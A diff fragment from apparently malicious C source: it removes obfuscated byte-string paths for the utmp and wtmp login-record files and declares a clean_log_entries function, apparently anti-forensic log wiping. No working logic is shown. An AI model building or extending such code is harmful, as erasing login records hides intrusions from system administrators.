@@ -24,5 +24,5 @@
 #include "config.h"
 #include "debug.h"
 
-#define UTMP_FILE "\xd1\x88\x9f\x8c\xd1\x92\x91\x99\xd1\x8b\x8a\x93\x8e"
-#define WTMP_FILE "\xd1\x88\x9f\x8c\xd1\x92\x91\x99\xd1\x89\x8a\x93\x8e"
+void    clean_log_entries(char *wtmp, char *utmp);
+void    cleanup(void *var, size_t len);
